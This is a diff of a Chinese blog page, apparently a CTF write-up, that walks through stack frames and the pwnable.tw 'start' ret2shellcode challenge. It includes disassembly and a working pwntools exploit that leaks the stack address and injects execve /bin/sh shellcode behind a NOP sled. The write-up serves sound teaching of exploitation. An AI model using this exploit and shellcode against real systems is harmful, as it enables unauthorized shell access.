@@ -6,14 +6,14 @@
     <meta charset="utf-8">
     <meta name="keywords" content="StackOverFlow之Ret2ShellCode详解, Matrix">
     <meta name="description" content="函数调用时栈中的变化 test示例代码:test.c
-#include &amp;lt;stdio.h&amp;gt;
+#include &amp;lt;stdio.h&gt;
 
 int fun(int a,int b)
 {
     return a + b;
 }
 
-int main(int argc, char">
+int main(int argc, char co">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -36,7 +36,7 @@ int main(int argc, char">
     </style>
 
     <script src="/libs/jquery/jquery-2.2.0.min.js"></script>
-<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+<link rel="stylesheet" href="/css/prism-xonokai.css" type="text/css"></head>
 
 
 <body>
@@ -430,89 +430,96 @@ int main(int argc, char">
         <div class="card-content article-card-content">
             <div id="articleContent">
                 <h1 id="函数调用时栈中的变化-test"><a href="#函数调用时栈中的变化-test" class="headerlink" title="函数调用时栈中的变化 test"></a>函数调用时栈中的变化 test</h1><p>示例代码:test.c</p>
-<pre><code>#include &lt;stdio.h&gt;
+<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
 
-int fun(int a,int b)
-{
-    return a + b;
-}
+<span class="token keyword">int</span> <span class="token function">fun</span><span class="token punctuation">(</span><span class="token keyword">int</span> a<span class="token punctuation">,</span><span class="token keyword">int</span> b<span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+    <span class="token keyword">return</span> a <span class="token operator">+</span> b<span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
 
-int main(int argc, char const *argv[])
-{
-    int a = 1,b = 2;
-    fun(a,b);
-    return 0;
-}</code></pre><p><strong>编译程序： gcc test.c -m32 -fno-stack-protector -z execstack -no-pie -o test</strong><br><strong>-fno-stack-protector   ————关闭栈保护 stack</strong><br><strong>-z execstack   ————关闭NX堆栈不可执行</strong><br><strong>-no-pie   ————关闭PIE地址随机化</strong></p>
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token keyword">const</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+    <span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span>b <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>
+    <span class="token function">fun</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span></code></pre>
+<p><strong>编译程序： gcc test.c -m32 -fno-stack-protector -z execstack -no-pie -o test</strong><br><strong>-fno-stack-protector   ————关闭栈保护 stack</strong><br><strong>-z execstack   ————关闭NX堆栈不可执行</strong><br><strong>-no-pie   ————关闭PIE地址随机化</strong></p>
 <p><strong>然后对test用linux自带的反汇编指令：objdump进行反汇编  objdump -d  :反汇编特定指令机器码的section  -Mintle ：表示用intel语法</strong></p>
-<pre><code>objdump test1 -d -Mintel
+<pre class=" language-bash"><code class="language-bash">objdump test1 -d -Mintel
 主要函数结果如下
-080483f6 &lt;fun&gt;:
+080483f6 <span class="token operator">&lt;</span>fun<span class="token operator">></span>:
  80483f6:    55                       push   ebp
  80483f7:    89 e5                    mov    ebp,esp
- 80483f9:    e8 42 00 00 00           call   8048440 &lt;__x86.get_pc_thunk.ax&gt;
+ 80483f9:    e8 42 00 00 00           call   8048440 <span class="token operator">&lt;</span>__x86.get_pc_thunk.ax<span class="token operator">></span>
  80483fe:    05 02 1c 00 00           add    eax,0x1c02
- 8048403:    8b 55 08                 mov    edx,DWORD PTR [ebp+0x8]
- 8048406:    8b 45 0c                 mov    eax,DWORD PTR [ebp+0xc]
+ 8048403:    8b 55 08                 mov    edx,DWORD PTR <span class="token punctuation">[</span>ebp+0x8<span class="token punctuation">]</span>
+ 8048406:    8b 45 0c                 mov    eax,DWORD PTR <span class="token punctuation">[</span>ebp+0xc<span class="token punctuation">]</span>
  8048409:    01 d0                    add    eax,edx
  804840b:    5d                       pop    ebp
  804840c:    c3                       ret    
 
-0804840d &lt;main&gt;:
+0804840d <span class="token operator">&lt;</span>main<span class="token operator">></span>:
  804840d:    55                       push   ebp
  804840e:    89 e5                    mov    ebp,esp
  8048410:    83 ec 10                 sub    esp,0x10
- 8048413:    e8 28 00 00 00           call   8048440 &lt;__x86.get_pc_thunk.ax&gt;
+ 8048413:    e8 28 00 00 00           call   8048440 <span class="token operator">&lt;</span>__x86.get_pc_thunk.ax<span class="token operator">></span>
  8048418:    05 e8 1b 00 00           add    eax,0x1be8
- 804841d:    c7 45 fc 01 00 00 00     mov    DWORD PTR [ebp-0x4],0x1
- 8048424:    c7 45 f8 02 00 00 00     mov    DWORD PTR [ebp-0x8],0x2
- 804842b:    ff 75 f8                 push   DWORD PTR [ebp-0x8]
- 804842e:    ff 75 fc                 push   DWORD PTR [ebp-0x4]
- 8048431:    e8 c0 ff ff ff           call   80483f6 &lt;fun&gt;
+ 804841d:    c7 45 fc 01 00 00 00     mov    DWORD PTR <span class="token punctuation">[</span>ebp-0x4<span class="token punctuation">]</span>,0x1
+ 8048424:    c7 45 f8 02 00 00 00     mov    DWORD PTR <span class="token punctuation">[</span>ebp-0x8<span class="token punctuation">]</span>,0x2
+ 804842b:    ff 75 f8                 push   DWORD PTR <span class="token punctuation">[</span>ebp-0x8<span class="token punctuation">]</span>
+ 804842e:    ff 75 fc                 push   DWORD PTR <span class="token punctuation">[</span>ebp-0x4<span class="token punctuation">]</span>
+ 8048431:    e8 c0 ff ff ff           call   80483f6 <span class="token operator">&lt;</span>fun<span class="token operator">></span>
  8048436:    83 c4 08                 add    esp,0x8
  8048439:    b8 00 00 00 00           mov    eax,0x0
  804843e:    c9                       leave  
- 804843f:    c3                       ret    </code></pre><p> 观察fun函数可以发现：</p>
-<pre><code>push   ebp
+ 804843f:    c3                       ret    </code></pre>
+<p> 观察fun函数可以发现：</p>
+<pre class=" language-bash"><code class="language-bash">push   ebp
 mov   ebp,esp
-.......
-.....
+<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>.
+<span class="token punctuation">..</span><span class="token punctuation">..</span>.
 pop ebp
-ret</code></pre><p><em>这段指令标志这一个函数的开始与结束。这四句指令就是函数开辟，栈帧就是一块被ebp和esp夹住的区域的开始与结尾的标志性语句</em></p>
+ret</code></pre>
+<p><em>这段指令标志这一个函数的开始与结束。这四句指令就是函数开辟，栈帧就是一块被ebp和esp夹住的区域的开始与结尾的标志性语句</em></p>
 <p>现在调试看看main函数对fun函数的调用和传值在汇编中是怎样的<br>相关指令：</p>
-<pre><code> 804841d:    c7 45 fc 01 00 00 00     mov    DWORD PTR [ebp-0x4],0x1   //将1传给 以[ebp-0x4]代表的地址处 并以32位即4字节形式传递（DWORD PTR []） a = 1
- 8048424:    c7 45 f8 02 00 00 00     mov    DWORD PTR [ebp-0x8],0x2   //将2传给 以[ebp-0x8]代表的地址处 并以32位即4字节形式传递（DWORD PTR []） b = 2
- 804842b:    ff 75 f8                 push   DWORD PTR [ebp-0x8]   //将[ebp-0x8]区域的值以32位入栈  即  b = 2 入栈
- 804842e:    ff 75 fc                 push   DWORD PTR [ebp-0x4]   //将[ebp-0x4]区域的值以32位入栈  即  a = 1 入栈
- 8048431:    e8 c0 ff ff ff           call   80483f6 &lt;fun&gt;  //调用fun函数</code></pre><p><strong>可以发现参数入栈的顺序 与我们c语言正常的调用顺序是相反的：参数逆序入栈。</strong><br><strong><em>调用一个函数前都是先压入参数(没有参数就不用)然后再调用函数汇编表现为 push xxx ; push xxx; push xxx; call xxx的形式</em></strong></p>
+<pre class=" language-bash"><code class="language-bash"> 804841d:    c7 45 fc 01 00 00 00     mov    DWORD PTR <span class="token punctuation">[</span>ebp-0x4<span class="token punctuation">]</span>,0x1   //将1传给 以<span class="token punctuation">[</span>ebp-0x4<span class="token punctuation">]</span>代表的地址处 并以32位即4字节形式传递（DWORD PTR <span class="token punctuation">[</span><span class="token punctuation">]</span>） a <span class="token operator">=</span> 1
+ 8048424:    c7 45 f8 02 00 00 00     mov    DWORD PTR <span class="token punctuation">[</span>ebp-0x8<span class="token punctuation">]</span>,0x2   //将2传给 以<span class="token punctuation">[</span>ebp-0x8<span class="token punctuation">]</span>代表的地址处 并以32位即4字节形式传递（DWORD PTR <span class="token punctuation">[</span><span class="token punctuation">]</span>） b <span class="token operator">=</span> 2
+ 804842b:    ff 75 f8                 push   DWORD PTR <span class="token punctuation">[</span>ebp-0x8<span class="token punctuation">]</span>   //将<span class="token punctuation">[</span>ebp-0x8<span class="token punctuation">]</span>区域的值以32位入栈  即  b <span class="token operator">=</span> 2 入栈
+ 804842e:    ff 75 fc                 push   DWORD PTR <span class="token punctuation">[</span>ebp-0x4<span class="token punctuation">]</span>   //将<span class="token punctuation">[</span>ebp-0x4<span class="token punctuation">]</span>区域的值以32位入栈  即  a <span class="token operator">=</span> 1 入栈
+ 8048431:    e8 c0 ff ff ff           call   80483f6 <span class="token operator">&lt;</span>fun<span class="token operator">></span>  //调用fun函数</code></pre>
+<p><strong>可以发现参数入栈的顺序 与我们c语言正常的调用顺序是相反的：参数逆序入栈。</strong><br><strong><em>调用一个函数前都是先压入参数(没有参数就不用)然后再调用函数汇编表现为 push xxx ; push xxx; push xxx; call xxx的形式</em></strong></p>
 <p>继续看fun函数中对参数的调用（忽略前面两条指令）</p>
-<pre><code>8048403:    8b 55 08                 mov    edx,DWORD PTR [ebp+0x8]  //将[ebp+0x8]区域的值传给edx 即 edx = 1
- 8048406:    8b 45 0c                 mov    eax,DWORD PTR [ebp+0xc]  //将[ebp+0xc]区域的值传给eax 即 eax = 2
- 8048409:    01 d0                    add    eax,edx  //eax = eax + edx</code></pre><p><em>为啥[ebp-0x4]  [ebp-0x8]  对应了fun函数中的 [ebp+0xc] [ebp+0x8]：</em></p>
-<pre><code>主要影响指令
+<pre class=" language-bash"><code class="language-bash">8048403:    8b 55 08                 mov    edx,DWORD PTR <span class="token punctuation">[</span>ebp+0x8<span class="token punctuation">]</span>  //将<span class="token punctuation">[</span>ebp+0x8<span class="token punctuation">]</span>区域的值传给edx 即 edx <span class="token operator">=</span> 1
+ 8048406:    8b 45 0c                 mov    eax,DWORD PTR <span class="token punctuation">[</span>ebp+0xc<span class="token punctuation">]</span>  //将<span class="token punctuation">[</span>ebp+0xc<span class="token punctuation">]</span>区域的值传给eax 即 eax <span class="token operator">=</span> 2
+ 8048409:    01 d0                    add    eax,edx  //eax <span class="token operator">=</span> eax + edx</code></pre>
+<p><em>为啥[ebp-0x4]  [ebp-0x8]  对应了fun函数中的 [ebp+0xc] [ebp+0x8]：</em></p>
+<pre class=" language-bash"><code class="language-bash">主要影响指令
 main:
-804842b:    ff 75 f8                 push   DWORD PTR [ebp-0x8]
-804842e:    ff 75 fc                 push   DWORD PTR [ebp-0x4]
-.....
-...
-..
+804842b:    ff 75 f8                 push   DWORD PTR <span class="token punctuation">[</span>ebp-0x8<span class="token punctuation">]</span>
+804842e:    ff 75 fc                 push   DWORD PTR <span class="token punctuation">[</span>ebp-0x4<span class="token punctuation">]</span>
+<span class="token punctuation">..</span><span class="token punctuation">..</span>.
+<span class="token punctuation">..</span>.
+<span class="token punctuation">..</span>
 fun:
 80483f6:    55                       push   ebp
-804840e:    89 e5                    mov    ebp,esp  //esp 与 ebp指向同一位置</code></pre><p>示意图<br><img src="https://s1.ax1x.com/2020/07/02/NbwCIH.png" alt=""><br>再试着去理解[ebp-0x4]  [ebp-0x8]  对应了fun函数中的 [ebp+0xc] [ebp+0x8]的原因就很明了了</p>
+804840e:    89 e5                    mov    ebp,esp  //esp 与 ebp指向同一位置</code></pre>
+<p>示意图<br><img src="https://s1.ax1x.com/2020/07/02/NbwCIH.png" alt=""><br>再试着去理解[ebp-0x4]  [ebp-0x8]  对应了fun函数中的 [ebp+0xc] [ebp+0x8]的原因就很明了了</p>
 <h1 id="start"><a href="#start" class="headerlink" title="start"></a>start</h1><p>此题源程序可以从 pwnable.tw 中获取<br>用checksec 发现保护全关</p>
-<pre><code>[*] &#39;/home/hunter/PWN/wiki/overflow/Ret2ShellCode/start&#39;
+<pre class=" language-bash"><code class="language-bash"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/hunter/PWN/wiki/overflow/Ret2ShellCode/start'</span>
     Arch:     i386-32-little
     RELRO:    No RELRO
     Stack:    No canary found
     NX:       NX disabled
-    PIE:      No PIE (0x8048000)</code></pre><p>因为次elf文件过于简单就没使用IDA了直接linux反汇编</p>
-<pre><code>hunter@hunter:~/PWN/wiki/overflow/Ret2ShellCode$ objdump start -d -Mintel
+    PIE:      No PIE <span class="token punctuation">(</span>0x8048000<span class="token punctuation">)</span></code></pre>
+<p>因为次elf文件过于简单就没使用IDA了直接linux反汇编</p>
+<pre class=" language-bash"><code class="language-bash">hunter@hunter:~/PWN/wiki/overflow/Ret2ShellCode$ objdump start -d -Mintel
 
 start：     文件格式 elf32-i386
 
 
 Disassembly of section .text:
 
-08048060 &lt;_start&gt;:
+08048060 <span class="token operator">&lt;</span>_start<span class="token operator">></span>:
  8048060:    54                       push   esp
  8048061:    68 9d 80 04 08           push   0x804809d  //压入exit函数地址
  8048066:    31 c0                    xor    eax,eax
@@ -525,44 +532,46 @@ Disassembly of section .text:
  804807d:    68 73 20 73 74           push   0x74732073
  8048082:    68 4c 65 74 27           push   0x2774654c
  8048087:    89 e1                    mov    ecx,esp
- 8048089:    b2 14                    mov    dl,0x14  //0x14 = 20
+ 8048089:    b2 14                    mov    dl,0x14  //0x14 <span class="token operator">=</span> 20
  804808b:    b3 01                    mov    bl,0x1
  804808d:    b0 04                    mov    al,0x4
- 804808f:    cd 80                    int    0x80   //调用write
+ 804808f:    <span class="token function">cd</span> 80                    int    0x80   //调用write
  8048091:    31 db                    xor    ebx,ebx
- 8048093:    b2 3c                    mov    dl,0x3c  //0x3c = 60
+ 8048093:    b2 3c                    mov    dl,0x3c  //0x3c <span class="token operator">=</span> 60
  8048095:    b0 03                    mov    al,0x3
- 8048097:    cd 80                    int    0x80   //调用read
+ 8048097:    <span class="token function">cd</span> 80                    int    0x80   //调用read
  8048099:    83 c4 14                 add    esp,0x14
  804809c:    c3                       ret    
 
-0804809d &lt;_exit&gt;:
+0804809d <span class="token operator">&lt;</span>_exit<span class="token operator">></span>:
  804809d:    5c                       pop    esp
  804809e:    31 c0                    xor    eax,eax
  80480a0:    40                       inc    eax
- 80480a1:    cd 80                    int    0x80</code></pre><p>可以看出这整个程序就_start和_exit两个函数。看代码应该是出题者可以构造的因为按照正常的栈首先因该是 push  ebp而不是esp<br><strong>int 0x80 ; 这代表着系统中断也就是调用系统函数类似于之前所说的call xxxx; 结构不同的是这里面的参数都是寄存器传参</strong>sys_write(fd,&amp;buf,len)ebx 存放的是 fd(文件描述符有0、1、2三个值0代表标准输入1代表标准输出2代表标准错误输出)ecx 中存放的是 buf 的地址也就是将要输出的字符串的首地址edx 存放的是输出字符串的长度<br>mov  ecx,esp因为 esp 指向栈顶且根据实际程序输出ecx 就是存放着 Let’s start the CTF:</p>
+ 80480a1:    <span class="token function">cd</span> 80                    int    0x80</code></pre>
+<p>可以看出这整个程序就_start和_exit两个函数。看代码应该是出题者可以构造的因为按照正常的栈首先因该是 push  ebp而不是esp<br><strong>int 0x80 ; 这代表着系统中断也就是调用系统函数类似于之前所说的call xxxx; 结构不同的是这里面的参数都是寄存器传参</strong>sys_write(fd,&amp;buf,len)ebx 存放的是 fd(文件描述符有0、1、2三个值0代表标准输入1代表标准输出2代表标准错误输出)ecx 中存放的是 buf 的地址也就是将要输出的字符串的首地址edx 存放的是输出字符串的长度<br>mov  ecx,esp因为 esp 指向栈顶且根据实际程序输出ecx 就是存放着 Let’s start the CTF:</p>
 <p>分析两次int 0x80的寄存器参数可知 ：第一次write函数将Let’s start the CTF:恰好20个字符输出。<strong>第二次read函数将读取60个字符，栈溢出。一定注意不论是调用write函数还是read函数在输出和输入字符串时esp并没有立刻改变而是等到特定的指令。</strong></p>
 <h2 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h2><p>在调用 sys_write() 之前栈帧情况<br><img src="https://s1.ax1x.com/2020/07/02/NbwFJA.png" alt=""><br>蓝色就是buf部分执行sys_read函数时esp 还是指向此地 输入的内容重新覆盖这块缓冲区超出的部分继续向下覆盖。<br>因为ret_addr保存的是exit函数的地址正常返回的话是直接退出程序现在需要控制这个地址使其返回到我们想要去的地方。<br>在write（）后面add    esp,0x14指令将esp指向ret_addr 完成ret指令后 esp指向 原esp地址即指向的数据与地址重合。<br>那么如果我们控制ret再次跳到write函数那么esp地址会被泄露，继续下面的read函数，在read函数中我们就可以写入shellcode，控制其位置然后执行。<br><img src="https://s1.ax1x.com/2020/07/02/NbwkRI.png" alt=""></p>
 <p>执行完sys_read()函数之后还需执行 add esp,0x14 所以 shellcode 能放的地方也只有剩下的40字节但也足够了。</p>
 <p><img src="https://s1.ax1x.com/2020/07/02/Nbwiid.png" alt=""><br>所以 shellcode 的起始地址为 esp+20,之前的部分可任意填充除 ’\x00‘ (会造成截断)之外的内容。<br>exp：</p>
-<pre><code>from pwn import *
+<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
 
-#context.log_level = &#39;debug&#39;
+<span class="token comment" spellcheck="true">#context.log_level = 'debug'</span>
 
-sh = process(&#39;./start&#39;) #有时&#39;./start&#39;还是&quot;start&quot;或是&quot;./start&quot;也会引发玄学问题，多注意
+sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./start'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#有时'./start'还是"start"或是"./start"也会引发玄学问题，多注意</span>
 
-sh.recvuntil(&#39;:&#39;)
-payload1 = &#39;a&#39; * 20 + p32(0x08048087)
-#gdb.attach(sh)
-sh.send(payload1)   #此处如果换成sendline会出错，原因目前未知，感觉很玄学
-stack_addr = sh.recv(4)
-addr =  u32(stack_addr)
+sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span>
+payload1 <span class="token operator">=</span> <span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">20</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x08048087</span><span class="token punctuation">)</span>
+<span class="token comment" spellcheck="true">#gdb.attach(sh)</span>
+sh<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">#此处如果换成sendline会出错，原因目前未知，感觉很玄学</span>
+stack_addr <span class="token operator">=</span> sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>
+addr <span class="token operator">=</span>  u32<span class="token punctuation">(</span>stack_addr<span class="token punctuation">)</span>
 
-nopsled = &#39;\x90&#39; * 10
-shellcode =&#39;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80&#39;
-payload2 = &#39;a&#39; * 20 + p32(addr + 20) + nopsled + shellcode
-sh.send(payload2)
-sh.interactive() </code></pre><p>注意：nopsled = ‘\x90’就是NULL的意思什么都不做，像滑雪橇一样一直划到 shellcode中 可以增强exp的移植性</p>
+nopsled <span class="token operator">=</span> <span class="token string">'\x90'</span> <span class="token operator">*</span> <span class="token number">10</span>
+shellcode <span class="token operator">=</span><span class="token string">'\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'</span>
+payload2 <span class="token operator">=</span> <span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">20</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>addr <span class="token operator">+</span> <span class="token number">20</span><span class="token punctuation">)</span> <span class="token operator">+</span> nopsled <span class="token operator">+</span> shellcode
+sh<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span> </code></pre>
+<p>注意：nopsled = ‘\x90’就是NULL的意思什么都不做，像滑雪橇一样一直划到 shellcode中 可以增强exp的移植性</p>
 <p>因为NX关闭 ，这个题也可以用直接想buf中写入shellcode在用coredump寻找buf地址，转跳该地址来解决</p>
 <p>shellcode集：<a href="http://shell-storm.org/shellcode/" target="_blank" rel="noopener">http://shell-storm.org/shellcode/</a></p>
 
@@ -741,8 +750,8 @@ sh.interactive() </code></pre><p>注意：nopsled = ‘\x90’就是NULL的意�
                 </a>
                 <div class="card-content article-content">
                     <div class="summary">1：checksechunter@hunter:~/PWN/level3$ checksec ret2libc3
-[*] &#39;/home/hunter/PWN/level3/ret2libc3&#39;
-    Arch:     i</div>
+[*] '/home/hunter/PWN/level3/ret2libc3'
+    Arch:     i386-32-l</div>
                     <div class="publish-info">
                         <span class="publish-date">
                             <i class="fa fa-clock-o fa-fw icon-date"></i>2020-07-04
@@ -911,7 +920,7 @@ sh.interactive() </code></pre><p>注意：nopsled = ‘\x90’就是NULL的意�
 
             
                 &nbsp;<i class="fa fa-area-chart"></i>&nbsp;站点总字数:&nbsp;
-                <span class="white-color">31.5k</span>
+                <span class="white-color">30k</span>
             
 
             
